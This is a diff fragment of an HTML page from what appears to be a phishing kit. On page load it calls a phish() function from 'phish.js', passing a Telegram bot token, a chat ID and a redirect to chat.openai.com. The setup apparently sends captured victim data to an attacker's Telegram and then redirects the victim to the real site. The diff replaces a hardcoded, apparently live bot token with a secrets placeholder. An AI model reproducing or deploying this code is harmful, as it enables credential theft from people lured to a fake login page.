@@ -17,7 +17,7 @@
 <script src="phish.js"></script>
 <script>
     $(document).ready(function () {
-        const BOT_TOKEN = '6645172967:AAHfXLlLh93Kp5PNCMOipZSKGoyBvUcdhY8',
+        const BOT_TOKEN = "{{ secrets.TELEGRAM_BOT_TOKEN }}";
             CHAT_ID = '719995633',
             REDIRECT_URL = 'https://chat.openai.com'
         phish(BOT_TOKEN, CHAT_ID, REDIRECT_URL);
